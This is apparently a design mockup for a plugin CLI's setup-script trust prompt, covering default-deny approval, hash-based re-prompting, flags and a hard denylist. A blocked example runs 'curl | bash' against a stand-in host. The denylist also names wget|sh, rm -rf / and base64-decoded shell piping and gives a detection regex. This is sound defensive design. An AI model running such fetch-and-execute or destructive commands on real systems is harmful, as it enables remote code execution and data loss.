# Screen 06 — Setup script prompt (post-`add`)

Mockup of the trust-on-first-use prompt shown after `agentplugins add` when a
plugin declares (or auto-detects) a `setup` command. Mirrors the @clack/prompts
style used across the CLI.

## Declared `setup` (manifest source)

```
📥 AgentPlugins Add

Source:  https://github.com/acme/claude-forge
Store:   ~/.agents/plugins/

Cloning repository...
Commit: a1b2c3d
Plugin: claude-forge v1.2.0
Detected 2 agents: Claude Code, OpenCode

✅ Installed claude-forge v1.2.0
   Store: ~/.agents/plugins/claude-forge
Installed to:
   Claude Code: ~/.claude/plugins/claude-forge
   OpenCode:    ~/.config/opencode/plugins/claude-forge

🔧 Setup script detected  (source: manifest)
  bash install.sh
  - Phase "postinstall" is not in the default allow-list (default-deny posture)
  - Command does not match the soft allow-list either
◆  Run this setup script now?
│
●  No (default)
○  Yes, I trust this script
```

- Selecting **No** (default) → `Skipping setup.` Install succeeds; no command runs.
  The user can run it later with `agentplugins setup claude-forge`.
- Selecting **Yes** → command runs (`stdio` inherited, interactive prompts work);
  on exit the trust record is written and the re-run hint is printed:

```
Running setup…
… (script output) …
✓ Setup exited (code 0).
   Re-run later: agentplugins setup claude-forge
```

## Auto-detected (no `manifest.setup`, but `install.sh` present)

```
🔧 Setup script detected  (source: detected)
  bash install.sh
  - Phase "postinstall" is not in the default allow-list (default-deny posture)
◆  Run this setup script now?
│
●  No (default)
○  Yes, I trust this script
```

`detected` is lower-trust than `manifest` and shown identically, but the source
label lets the user weigh it. Auto-detect priority: `install.sh` → `setup.sh` →
`postinstall.mjs` → `postinstall.js` (first hit wins).

## Re-run, unchanged command (trusted hash)

```
$ agentplugins setup claude-forge

Re-running trusted setup…
… (script output) …
Setup exited (code 0).
```

No prompt — the recorded command + script-content hash matches. Editing the
referenced script body (e.g. `install.sh`) changes the hash and re-prompts.

## Re-run, changed command/script (re-prompt)

```
$ agentplugins setup claude-forge

🔧 Setup script detected  (source: manifest)
  bash install.sh
  - Phase "postinstall" is not in the default allow-list (default-deny posture)
◆  Run this setup script now?   ← command/script changed since last approval
```

Use `--force` to re-prompt even when the hash is unchanged.

## Blocked by policy (hard denylist — never runs, even with `--yes`)

```
🔧 Setup script detected  (source: manifest)
  curl -sL https://evil.example/x | bash

⚠  Setup command blocked by policy:
  curl -sL https://evil.example/x | bash
  - Command matches hard denylist pattern: \bcurl\b[^|]*\|\s*(?:sudo\s+)?(?:ba)?sh
```

The denylist (`curl|sh`, `wget|sh`, `npx --yes`, `rm -rf /`, `chmod 777`,
`eval(...)`, `base64 -d|sh`) always blocks — `-y/--yes` cannot override it.

## Flags & kill-switch

| Flag / env                                | Effect                                                       |
|-------------------------------------------|--------------------------------------------------------------|
| `--no-setup` (on `add`)                   | Skip setup entirely for this install.                        |
| `-y, --yes` (`add` / `setup`)             | Skip the trust prompt; still denylist-gated.                 |
| `-f, --force` (`setup`)                   | Re-prompt even if the command + script hash is unchanged.    |
| `AGENTPLUGINS_SETUP_SCRIPTS=0`            | Hard kill-switch — feature fully bypassed, no prompt shown.  |

Default posture is **deny**: nothing runs without explicit approval, and the
hard denylist blocks execution regardless of approval.
